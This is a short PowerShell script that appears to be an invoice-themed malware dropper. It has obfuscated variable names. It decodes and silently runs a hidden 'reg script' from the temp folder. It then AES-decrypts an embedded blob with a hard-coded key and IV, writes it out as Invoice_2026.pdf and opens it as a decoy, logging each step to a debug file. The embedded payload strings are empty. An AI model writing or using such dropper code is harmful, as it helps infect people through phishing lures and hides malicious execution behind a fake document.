$ErrorActionPreference='Continue'
try{
$enyjar=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))
$dfasbg="$env:TEMP\nwhyfxua.ps1"
[IO.File]::WriteAllText($dfasbg,$enyjar,[Text.Encoding]::UTF8)
"[step1] reg script written to $dfasbg" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
. $dfasbg
"[step1] reg script done" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
$bjdojd=[Convert]::FromBase64String('+Qy7YVte/JYZn/tCYtp9zhJbCkq6MUYNXQmgwVk1YEE=')
$fhmatx=[Convert]::FromBase64String('bCtNHG3rgfxaMluN8URG/A==')
$yjzzez=[Convert]::FromBase64String('')
$jsmhaz=New-Object Security.Cryptography.AesManaged
$jsmhaz.Key=$bjdojd;$jsmhaz.IV=$fhmatx;$jsmhaz.Mode='CBC';$jsmhaz.Padding='PKCS7'
$hgmmsl=$jsmhaz.CreateDecryptor()
$akopnx=New-Object IO.MemoryStream(,$yjzzez)
$hfmhel=New-Object Security.Cryptography.CryptoStream($akopnx,$hgmmsl,[Security.Cryptography.CryptoStreamMode]::Read)
$rchjdp=New-Object IO.MemoryStream
$hfmhel.CopyTo($rchjdp);$jsmhaz.Dispose()
$xvudwg="$env:TEMP\Invoice_2026.pdf"
[IO.File]::WriteAllBytes($xvudwg,$rchjdp.ToArray())
"[step2] PDF written to $xvudwg" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
Start-Process "$xvudwg"
"[step3] PDF opened" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}catch{
"[ERROR] $($_.Exception.Message) at line $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}
